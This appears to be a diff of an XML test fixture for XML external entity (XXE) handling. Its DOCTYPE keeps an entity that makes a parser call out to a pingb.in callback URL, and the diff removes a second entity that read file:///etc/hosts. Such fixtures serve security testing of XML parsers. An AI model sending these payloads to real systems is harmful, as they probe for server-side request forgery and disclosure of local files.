@@ -1,11 +1,9 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE roottag [
 <!ENTITY http SYSTEM "http://pingb.in/p/4cd02dfed1c894c72e0752a5a99a";>
-<!ENTITY file SYSTEM "file:///etc/hosts">
 ]>
 <test>
     <vsr>
-        <tag1>&file;</tag1>
         <tag2>&http;</tag2>
     </vsr>
 </test>
